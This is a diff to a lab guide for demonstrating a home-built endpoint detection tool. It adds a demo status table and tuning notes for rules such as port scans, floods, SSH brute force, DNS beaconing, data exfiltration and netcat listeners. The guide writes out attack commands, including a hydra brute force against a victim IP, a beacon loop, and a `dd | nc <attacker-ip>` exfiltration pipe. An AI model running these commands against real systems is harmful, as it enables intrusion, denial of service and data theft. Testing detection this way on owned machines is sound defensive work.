@@ -13,6 +13,21 @@ real packets at it. Everything below targets a machine you own, on a network you
 - **Attacker laptop:** any machine with the usual security tools (`nmap`, `hping3`/`nping`, `hydra`, `nc`) —
   install via Homebrew/apt if missing.
 
+## Demo status
+
+| # | Demo | Rule | Status |
+|---|---|---|---|
+| 1 | nmap port scan | Port Scan | Verified live (two laptops) |
+| 2 | ICMP flood | ICMP Flood | Verified live |
+| 3 | SYN flood | SYN Flood | Verified live |
+| 4 | SSH wrong passwords | Authentication Attack | Verified live |
+| 5 | DNS beacon loop | DNS Beaconing | Verified live |
+| 6 | Reverse shell | Reverse Shell | Verified live |
+| 8 | `nc -l 4444` | Suspicious Listening Port | Verified live |
+| 7 | Large upload | Data Exfiltration | Unit-tested; follow the notes in section 7 |
+| 9 | Process chain | Suspicious Process Chain | Unit-tested; not yet run live |
+| - | Failures then a successful login | Brute Force Authentication | Unit-tested only (see section 4) |
+
 ## 1. Port scan → `Port Scan`
 
 On the attacker:
@@ -45,17 +60,28 @@ from the attacker:
 ```bash
 hydra -l admin -P /usr/share/wordlists/common-passwords.txt ssh://<victim-ip>
 ```
+**Manual version (recommended for a demo):** from the attacker, run `ssh wronguser@<victim-ip>` three separate times
+and type a wrong password each time (each connection counts once, so three separate connections are needed). You get
+exactly **one** alert, `Authentication Attack from <ip> (N failures)`, plus the incident, block, sealed evidence and
+history row. Failures with no remote address (a local `sudo` typo, `loginwindow`) never raise an alert.
+
 With Remote Login on, failed logins are read live from the victim's unified log (`log stream`) and matched by
 source IP/port — detection is typically ~1s after the failures land. Without Remote Login, the same connection
 storm still trips the network-only heuristic (new connections to port 22 from one IP).
+
+> **Brute Force Authentication** (3+ failures *followed by a successful login*) cannot be triggered live: the
+> Authentication Attack rule contains the source on the third failure and clears its events, so a later success has
+> nothing to pair with. It is covered by unit tests instead.
 
 ## 5. DNS beaconing → `DNS Beaconing`
 
 Run **on the victim** (simulates an already-compromised host phoning out on a schedule):
 ```bash
-while true; do dig +short update-check.c2-beacon.example.org @8.8.8.8 >/dev/null; sleep 2; done
+while true; do dig +short example.com @8.8.8.8 >/dev/null; sleep 2; done
 ```
-Regular-interval lookups of the same domain sinkhole it after ~5 queries.
+Five or more evenly spaced lookups of the same domain within 60 s sinkhole it. Any domain works (the rule checks
+timing, not the name; `.local`/`.arpa`/`.lan` are ignored). The alert names the host IP when the sniffer cannot tie the
+query to a process. Release the sinkholed domain (or Reset Lab) before repeating the demo.
 
 ## 6. Reverse shell → `Reverse Shell`
 
@@ -73,13 +99,16 @@ the shell process is flagged as contained (simulated — the process itself isn'
 
 ## 7. Data exfiltration → `Data Exfiltration`
 
+The attacker is another LAN machine, and the rule ignores private destinations by default. For this demo set
+`exfil_monitor_private_dst` to `true` (EDR Rules page as an admin, or `backend/config.json`) and set it back afterwards.
+
 Attacker:
 ```bash
 nc -l 9999 > /dev/null
 ```
-Victim:
+Victim (macOS needs lowercase `1m`; Linux `dd` accepts `1M`):
 ```bash
-dd if=/dev/zero bs=1M count=150 | nc <attacker-ip> 9999
+dd if=/dev/zero bs=1m count=150 | nc <attacker-ip> 9999
 ```
 ~150 MB in one burst clears the 100 MB / 20s threshold. The rule also requires the transfer to be upload-dominant
 (≥75% of the bytes exchanged with that peer go out, not come back) - this one-way `nc` push easily qualifies, but
@@ -92,11 +121,13 @@ On the victim:
 ```bash
 nc -l 4444
 ```
-A `nc`/`netcat`/`nmap`-named process opening a new listening socket is flagged immediately.
+A `nc`/`netcat`/`nmap`-named process opening a new listening socket is flagged immediately, as exactly one alert
+(`Suspicious Listening Socket: nc on port 4444`). Stock macOS services such as `cupsd` (631), AirPlay on `ControlCenter`
+(5000/7000), `rapportd` and `sharingd` are trusted and stay quiet.
 
 ## 9. Suspicious process chain → `Suspicious Process Chain`
 
-On the victim, spawn `nc` from `python3` (stands in for a macro/script launching a shell):
+Not yet verified live. On the victim, spawn `nc` from `python3` (stands in for a macro/script launching a shell):
 ```bash
 python3 -c "import subprocess,time; subprocess.Popen(['nc','-l','5555']); time.sleep(60)"
 ```
